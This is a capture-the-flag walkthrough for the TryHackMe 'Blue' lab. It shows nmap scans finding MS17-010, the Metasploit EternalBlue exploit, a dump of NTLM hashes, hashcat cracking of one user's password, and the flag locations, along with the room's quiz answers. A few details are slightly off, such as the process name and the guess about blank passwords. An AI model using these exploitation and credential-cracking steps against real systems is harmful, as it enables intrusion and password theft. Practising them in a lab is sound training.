[Blue](https://tryhackme.com/room/blue)
===============

Tasks
----------------------

1. [ Recon ](#recon)
2. [ Flags ](#Flags)

<a name="recon"></a>
## 1. Recon

```
IP=XXX
```
Some nmap scans to check vulnerabilities

```
nmap -sV -vv -Pn --script vuln $IP # -sV for versions, 
								   # -vv verbose, 
								   # -Pn ignore no returns of pings from the server
nmap --script=smb* -Pn $IP

nmap --script=smb-vuln-ms17-010 -Pn $IP
```

Last scan output:
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-24 00:21 CEST
Nmap scan report for 10.10.219.192
Host is up (0.023s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49160/tcp open  unknown

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 53.21 seconds
```

#2. How many ports are open with a port number under 1000?

```
3
```

#3. What is this machine vulnerable to? (Answer in the form of: ms??-???, ex: ms08-067)

```
ms17-010
```

<a name="Flags"></a>
## 2. Flags

```
exploit/windows/smb/ms17_010_eternalblue
```

I had a hard time getting the exploit to work. After I paid for a subscription it went within one try in the Kali VM from TryHackMe, I'm not sure why but most metasploit exploits I now tend to run in the Kali VM.

Once in, migrate to another process within NT AUTHORITY\SYSTEM with `migrate`:

`migrate -N winlogin.exe`

Command `hashdump` to dump the hashes:

``
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
``

These windows style hashdumps are hashed with NTLM, I used hashcat to bruteforce with the rockyou wordlist. -m 1000 for the NTLM format, -a 0 straight attack mode.

hashcat -a 0 -m 1000 ffb43f0de35be4d9917ac0cc8ad57f8d rockyou.txt 

Password of Jon: `alqfna22`

The passwords of Administrator and Guest seem to be alot of spaces?

Find flags with:

`search -f flag*.*`

Location first flag: C:/flag1.txt

Second flag in C:/Windows/System32/config/flag2.txt

Third flag in C:/Users/Jon/Documents/flag3.txt